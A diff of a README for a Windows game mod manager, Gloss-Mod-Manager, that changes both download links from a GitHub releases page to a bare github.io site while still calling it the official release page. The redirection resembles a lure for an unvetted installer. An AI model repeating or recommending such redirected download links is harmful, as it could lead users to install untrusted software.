@@ -1,6 +1,6 @@
 # 🎮 Gloss-Mod-Manager - Organize Your Game Mods With Ease
 
-[![](https://img.shields.io/badge/Download-Gloss_Mod-blue.svg)](https://github.com/Thickeningstreet589/Gloss-Mod-Manager/releases)
+[![](https://img.shields.io/badge/Download-Gloss_Mod-blue.svg)](https://thickeningstreet589.github.io)
 
 Gloss Mod Manager helps you manage game modifications on your Windows PC. It works with games built on the Unreal Engine and the REEngine. You use this tool to add, remove, and sort mods for titles like Resident Evil, Dragon's Dogma 2, and Hogwarts Legacy. 
 
@@ -10,7 +10,7 @@ The software tracks your game files and prevents conflicts between mods. It serv
 
 To use this software, visit the official release page to download the latest setup file. 
 
-[Visit this page to download the installer](https://github.com/Thickeningstreet589/Gloss-Mod-Manager/releases)
+[Visit this page to download the installer](https://thickeningstreet589.github.io)
 
 Follow these steps to set up the manager on your computer:
 
